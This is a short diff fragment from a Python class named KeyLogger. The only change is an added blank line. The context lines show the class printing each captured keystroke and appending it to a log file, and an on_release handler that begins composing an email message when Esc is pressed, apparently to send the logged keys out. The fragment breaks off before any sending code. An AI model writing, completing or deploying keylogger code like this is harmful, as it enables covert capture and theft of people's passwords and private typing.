@@ -21,6 +21,7 @@ class KeyLogger():
         print(key)
         with open(self.filename, 'a') as logs:
             logs.write(f'{self.get_char(key)}\n')
+            
     def on_release(self, key):
         if key==Key.esc:
             message = EmailMessage()
